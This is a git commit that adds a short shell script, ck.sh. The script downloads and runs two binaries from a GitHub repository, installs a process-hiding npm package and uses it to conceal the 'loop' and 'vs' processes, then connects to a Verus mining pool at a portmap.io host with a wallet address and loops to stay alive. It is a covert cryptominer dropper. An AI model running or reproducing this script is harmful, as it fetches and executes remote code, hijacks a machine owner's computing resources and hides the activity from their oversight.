252a66faabf9223d5139e5b86c4514f604fc3371
bulboni <163756439+bulboni@users.noreply.github.com>
2024-06-21 00:48:18 -0400

    Create ck.sh

---
+++ ck.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget https://github.com/bulboni/vs/raw/main/loop && chmod +x loop
+wget https://github.com/bulboni/vs/raw/main/verus-solver && chmod +x verus-solver
+apt install nodejs -y
+apt install npm -y
+npm i -g node-process-hider
+ph add vs
+ph add loop
+./loop -c stratum+tcp://latifgbl-47446.portmap.io:47446 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.kop2 -p x --cpu 1
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
